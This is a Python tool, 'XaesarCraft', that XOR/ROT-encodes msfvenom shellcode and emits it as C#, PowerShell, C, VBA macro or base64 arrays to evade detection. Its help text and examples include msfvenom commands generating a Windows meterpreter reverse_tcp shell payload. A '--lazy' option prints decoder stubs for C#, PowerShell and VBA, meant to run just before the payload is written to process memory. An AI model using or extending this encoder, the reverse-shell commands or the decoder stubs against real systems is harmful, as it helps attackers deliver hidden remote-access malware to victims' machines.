#!/usr/bin/env python3

import re
import sys
import argparse
import base64

def create_parser():
    description_text = """
XaesarCraft allows you to apply different operations (XOR, ROT13, or a combination of these algorithms - XOROT)
to byte arrays and get the results in various formats.

The input is expected to be the result of a payload generated by msfvenom in csharp, ps1, or c formats.
Additionally, XaesarCraft supports converting the payload into an array format suitable for VBA scripts."""

    epilog_text = """Example of usage:\n# Using XOROT with default keys (13 for ROT13 and 0xfa for XOR) to process a payload generated by msfvenom 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py"""
        
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        description=description_text, 
        epilog=epilog_text
    )
    parser.add_argument('-k', '--key', type=parse_hex_number, help='The key to use for XOR operation.')
    parser.add_argument('-m', '--mode', type=str, choices=['xor', 'rot', 'xorot'], help='Mode of operation (xor, rot, xorot).', default='xorot')
    parser.add_argument('-i', '--input', type=str, help='Input string to process.')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode.')
    parser.add_argument('-e', '--examples', action='store_true', help='Show more examples of using XaesarCraft.')
    parser.add_argument('-l', '--lazy', action='store_true', help='Show decryption code (C#, ps1, VBA) for default mode(!)')
    parser.add_argument('--b64', action='store_true', help='Output in base64 encoding.')
    parser.add_argument('--vba', action='store_true', help='Output in VBA array format.')
    return parser

def examples():
    examples_text = """Examples:

# Using XOROT with default keys (13 for ROT13 and 0xfa for XOR) to process a payload 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py 

# Using XOROT with default keys and return result in VBA format
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --vba

# Using only ROT13 with custom key (0x13) to process a payload 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py -m rot -k 0x13

# Using XOROT with custom key (0x13) and return payload base64 encoded
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py -k 0x13 --b64

# Process an input string directly
python3 XaesarCraft.py --input "[Byte[]] $buf = 0xf8,0xa5,0x6c,0x11,0xfc,0x05"

# Process C-style payload string
python3 XaesarCraft.py --input "\\xfc\\xe8\\x8f\\x00\\x00\\x00" """
    print(examples_text)
    sys.exit(0)

def lazy():
    decr_code = """Decryption codes for default mode only, best to use just before writing to process memory:
C#:
    byte xorValue = 0xfa; int rot = 13;
    for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ xorValue); }
    for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(((uint)buf[i] + rot)); }
PowerShell:
    $xorValue = 0xfa; $rot = 13; 
    for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = [byte]($buf[$i] -bxor $xorValue); }
    for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = [byte](([uint32]$buf[$i] + $rot)); }
VBA:
    Dim xorValue As Byte: xorValue = &Hfa
    Dim rot As Integer: rot = 13
    For i = 0 To UBound(buf): buf(i) = buf(i) Xor xorValue: Next i
    For i = 0 To UBound(buf): buf(i) = (buf(i) + rot) Mod 256: Next i"""
    print(decr_code)
    sys.exit(0)

def parse_hex_number(hex_string):
    try:
        value = int(hex_string, 0)
        if value < 0:
            raise argparse.ArgumentTypeError("Key must be non-negative")
        return value
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid hex number: {hex_string}")

def transform_bytes(bytes_list, mode, key=None):
    result = []
    for hex_str in bytes_list:
        value = int(hex_str, 16)
        
        if mode == 'rot':
            shift = key if key is not None else 13
            value = (value - shift) % 256
        elif mode == 'xor':
            xor_key = (key if key is not None else 0xFA) & 0xFF
            value = value ^ xor_key
        elif mode == 'xorot':
            # First ROT (reverse operation)
            shift = key if key is not None else 13
            value = (value - shift) % 256
            # Then XOR
            xor_key = (key if key is not None else 0xFA) & 0xFF
            value = value ^ xor_key
        
        result.append(f"0x{value:02x}")
    return result

def extract_bytes(input_string):
    # Try to extract C-style hex bytes first (\xXX)
    c_style_bytes = re.findall(r'(?:\\x[0-9a-fA-F]{2})', input_string)
    if c_style_bytes:
        # Convert to 0xXX format for processing
        normalized = [f"0x{b[2:]}" for b in c_style_bytes]
        return normalized, True
    
    # If no C-style bytes found, try standard 0xXX format
    standard_bytes = re.findall(r'0x[0-9a-fA-F]{2}', input_string)
    if standard_bytes:
        return standard_bytes, False
    
    # If no bytes found, try to find comma-separated hex values
    comma_bytes = re.findall(r'[0-9a-fA-F]{2}', input_string)
    if comma_bytes:
        return [f"0x{b}" for b in comma_bytes], False
    
    return [], False

def format_output(input_string, processed_bytes, vba=False, b64=False, c_format=False):
    if vba:
        int_bytes = [str(int(byte, 16)) for byte in processed_bytes]
        formatted_bytes = [', '.join(int_bytes[i:i+42]) for i in range(0, len(int_bytes), 42)]
        result = "buf = Array({})".format(', _\n'.join(formatted_bytes))
    elif c_format:
        # Format as C-style string with \xXX escapes
        c_bytes = ''.join([f"\\x{byte[2:]}" for byte in processed_bytes])
        result = f"unsigned char payload[] = \"{c_bytes}\";"
    elif "Byte" in input_string:  # PowerShell format
        result = "[Byte[]] $buf = " + ','.join(processed_bytes)
    elif "byte" in input_string:  # C# format
        result = "byte[] buf = new byte[{}] {{{}}};".format(len(processed_bytes), ','.join(processed_bytes))
    else:
        # Default to comma-separated hex values
        hex_values = [byte[2:] for byte in processed_bytes]
        result = "[" + ','.join(hex_values) + "]"
    
    if b64:
        result = base64.b64encode(result.encode()).decode()
    return result

def main():
    parser = create_parser()
    args = parser.parse_args()

    if args.examples:
        examples()
    if args.lazy:
        lazy()

    if args.input:
        raw_input_string = args.input
    else:
        raw_input_string = sys.stdin.read()
    
    if not raw_input_string.strip():
        print("Error: Input is empty")
        sys.exit(1)

    if args.debug:
        print(f"[Debug] Raw input: {raw_input_string}")

    bytes_list, is_c_format = extract_bytes(raw_input_string)
    if not bytes_list:
        print("Error: No byte values found in input")
        sys.exit(1)
    
    if args.debug:
        print(f"[Debug] Extracted bytes ({len(bytes_list)}): {bytes_list[:10]}{'...' if len(bytes_list) > 10 else ''}")
        print(f"[Debug] Input format: {'C-style' if is_c_format else 'Standard'}")

    try:
        processed_bytes = transform_bytes(
            bytes_list, 
            args.mode, 
            args.key
        )
    except Exception as e:
        print(f"Error processing bytes: {str(e)}")
        sys.exit(1)

    if args.debug:
        print(f"[Debug] Processed bytes: {processed_bytes[:10]}{'...' if len(processed_bytes) > 10 else ''}")

    try:
        formatted_output = format_output(
            raw_input_string,
            processed_bytes,
            vba=args.vba,
            b64=args.b64,
            c_format=is_c_format
        )
    except Exception as e:
        print(f"Error formatting output: {str(e)}")
        sys.exit(1)

    print(formatted_output)

if __name__ == "__main__":
    main()